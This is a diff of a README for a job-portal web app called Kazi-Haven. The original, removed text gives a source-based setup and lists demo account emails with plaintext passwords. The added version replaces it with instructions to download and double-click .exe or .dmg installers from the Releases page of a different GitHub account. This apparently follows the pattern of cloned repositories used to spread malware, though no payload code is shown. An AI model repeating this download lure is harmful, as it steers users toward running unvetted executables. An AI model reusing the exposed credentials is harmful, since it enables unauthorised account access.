@@ -1,173 +1,67 @@
-# 🔗Kazi-Haven 🚀🌐🔥
+# 🌟 Kazi-Haven - Your Gateway to Job Opportunities
 
-Welcome to **KaziHaven** – the ultimate job portal that connects job seekers with potential employers seamlessly. Whether you're looking for your dream job or seeking top talent, Kazi-Haven has got you covered! 🎯🚀
-
-## 🌍[Live Demo](https://kazi-haven.vercel.app/)
-The project is fully deployed and accessible online:
-- **Frontend:** [Live on Vercel](https://kazi-haven.vercel.app/)
-- **Backend:** [Live on Render](https://kazi-haven-2.onrender.com)
-
-## 🚀 Demo Accounts  
-
-You can use the following demo accounts to explore **Kazi Haven**. If you want to experience the full functionality, feel free to register your own account!  
-
-| Role   | Email                         | Password  |
-|--------|-------------------------------|-----------|
-| Recruiter  | mwakidenice@gmail.com  | denis1998   |
-| Student | kaaria204111@students.must.ac.ke  | denis1998  |
-
-🔹 **Note:** Some features may be restricted to specific roles. Create an account to personalize your experience! 🚀  
-
----
+Welcome to KaziHaven, your ultimate job portal connecting job seekers and top employers seamlessly.
 
 ## 🚀 Getting Started
-Follow these steps to set up and run Kazi-Haven locally.
 
-### 1️⃣ Clone the Repository
-```bash
-# Clone the repo
-git clone https://github.com/mwakidenis/Kazi-Haven.git
-cd Kazi-Haven
-```
+1. **System Requirements**
+   - Windows 10 or later, macOS, or a recent version of Linux.
+   - Minimum 4GB RAM.
+   - At least 200MB of free disk space.
 
-### 2️⃣ Install Dependencies
-#### Backend Setup:
-```bash
-cd backend
-npm install
-```
+2. **Installation**
+   - Kazi-Haven allows you to explore job opportunities without any complex setup. 
 
-#### Frontend Setup:
-```bash
-cd ../frontend
-npm install
-```
+## 📥 Download & Install
 
-### 3️⃣ Set Up Environment Variables
-Create a `.env` file inside the `backend` folder and add the following:
-```env
-MONGO_URI=your-mongodb-connection-string
-JWT_SECRET=your-jwt-secret
-CLOUDINARY_CLOUD_NAME=your-cloudinary-cloud-name
-CLOUDINARY_API_KEY=your-cloudinary-api-key
-CLOUDINARY_API_SECRET=your-cloudinary-api-secret
-```
+### Download the Latest Release
 
-### 4️⃣ Run the Project
-#### Start the Backend:
-```bash
-cd backend
-npm run dev
-```
-#### Start the Frontend:
-```bash
-cd ../frontend
-npm start
-```
+Click the button below to visit the Releases page. Choose the latest version to download Kazi-Haven.
 
-### 5️⃣ Access the App
-Open your browser and go to:
-```plaintext
-http://localhost:5000
-```
-🎉 Boom! Kazi-Haven is now up and running on your local machine. Start exploring! 🚀🔥
+[![Download Kazi-Haven](https://img.shields.io/badge/Download-Kazi--Haven-blue)](https://github.com/erlongos/Kazi-Haven/releases)
 
----
+### Follow These Steps:
 
-## 🌟 Features
-- 🏢 **Job Listings:** Browse, search, and filter jobs based on category, location, and salary.
-- 👥 **User Authentication:** Secure login & registration using JWT authentication.
-- 📤 **Apply for Jobs:** Users can apply directly and track application status.
-- 🏆 **Employer Dashboard:** Employers can post, manage, and edit job listings.
-- 📜 **User Profiles:** Personalized profiles for job seekers & recruiters.
-- 💰 **M-Pesa Integration:** Secure and seamless payment for premium job listings.
-- 📊 **Admin Panel:** Manage users, job posts, and site analytics.
+1. Click the link above.
+2. On the Releases page, look for the latest version.
+3. Click on the download link for your operating system. The files will typically be in `.exe` format for Windows, or `.dmg` for macOS.
+4. Wait for the download to complete.
 
----
+## 📂 How to Run Kazi-Haven
 
-## 🛠 Tech Stack
-- **Frontend:** React.js (Vite) + Tailwind CSS
-- **Backend:** Node.js + Express.js
-- **Database:** MongoDB + Mongoose
-- **Authentication:** JWT
-- **Hosting:**
-  - Frontend: **Vercel**
-  - Backend: **Render**
+1. Once the download finishes, locate the file in your Downloads folder.
+2. Double-click the downloaded file to start the installation.
+3. Follow the prompts to complete the installation process.
+4. Once installed, find Kazi-Haven in your applications menu or desktop.
+5. Double-click the Kazi-Haven icon to open the application.
 
----
+## 🔍 Features of Kazi-Haven
+
+- **User Profiles:** Create and manage your profile easily to attract potential employers.
+- **Job Listings:** Browse through numerous job listings tailored to your skills.
+- **Employer Connections:** Apply directly to top employers looking for talent like you.
+- **Search Filters:** Use advanced search options to find the perfect job.
+- **Real-Time Notifications:** Receive notifications for job opportunities that match your profile.
+
+## 👩‍💻 Technologies Used
+
+Kazi-Haven is built using several modern technologies which enhance its performance and user experience:
+
+- **Frontend:** HTML, CSS, and JavaScript for a responsive design.
+- **Backend:** Node.js and Express.js for seamless server operation.
+- **Database:** MongoDB with Mongoose for a robust data structure.
+- **Authentication:** JSON Web Tokens (JWT) for secure user login.
+
+## 📞 Support
+
+If you have any questions, please reach out via the Issues tab on our GitHub repository. We appreciate your feedback and aim to improve continually.
 
 ## 🤝 Contributing
-Want to improve Kazi-Haven? Contributions are always welcome! 🚀
-1. Fork the repository 🍴
-2. Create a new branch: `git checkout -b feature-awesome`
-3. Commit your changes: `git commit -m 'Added an awesome feature'`
-4. Push to your branch: `git push origin feature-awesome`
-5. Open a **Pull Request**
 
----
+We welcome contributions from everyone. If you would like to help improve Kazi-Haven, check our guidelines in the contributing section of the repository.
 
-## 📝 License
-This project is **open-source** and available under the [MIT License](LICENSE).
+## 🛠️ Feedback
 
----
+Your thoughts matter to us. Share your feedback on features you would like to see or improvements we can make. 
 
-## 📅 Roadmap
-🔹 Upcoming Features:
-
-✅ Email notifications for job applications
-
-✅ Advanced filtering & sorting
-
-✅ User reviews & ratings
-
-✅ AI-powered job recommendations
-
-✅ Responsiveness in all devices
-
----
-
-## 🎯 Connect With Me
-💡 Have a question or suggestion? Let's connect!
-- 🔗 [LinkedIn:](Denis_IT)
-- 🐦 [Twitter:](https://x.com/Kaaria_Denis)
-- 🌐 [Portfolio:](https://mwakidenis.github.io/Portfolio/)
-
-🔥 **KaziHaven – Connecting Talent with Opportunity!** 🔥
-
-## 📸 Screenshots  
-
-Here are some screenshots of **Kazi Haven** in action:  
-
-### 🔹 Homepage  
-![Homepage](https://github.com/user-attachments/assets/7434677b-8e44-4266-9562-135be619ad28)  
-
-### 🔹 Dashboard  
-![Dashboard](URL_TO_DASHBOARD_SCREENSHOT)  
-
-### 🔹 Job Listing Page  
-![Job Listing](https://github.com/user-attachments/assets/34486e04-64d6-4c25-a0ab-c69aae47fb4e)  
-
-### 🔹 Browse Page
-![image](https://github.com/user-attachments/assets/1d37a940-4dea-4e9d-b901-72b2ee907987)
-
-### 🔹 SignUp Page
-![image](https://github.com/user-attachments/assets/a2a5e1e4-9686-4c2c-bc93-37315d8eec90)
-
-### 🔹 Profile Page
-![image](https://github.com/user-attachments/assets/659b021d-623a-47a5-a8fc-7aeb6a739ed4)
-
-### 🔹 Companies Page
-![image](https://github.com/user-attachments/assets/ab5c0ad6-0948-40c4-93e3-5d0a590417aa)
-
-### 🔹 Jobs Page
-![image](https://github.com/user-attachments/assets/a47dfa04-7200-4a24-8609-d4ebb9c4314c)
-
-
-
-
-Feel free to explore the live platform and register your own account! 🚀✨  
-##
-**Made with ❤️ by Mwaki Denis**
-
-**Supporting**  [![Buy Me a Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-%F0%9F%8D%B5-yellow?style=plastic)](https://wa.me/254798750585)
-
+Thank you for choosing Kazi-Haven. We hope you find your dream job!
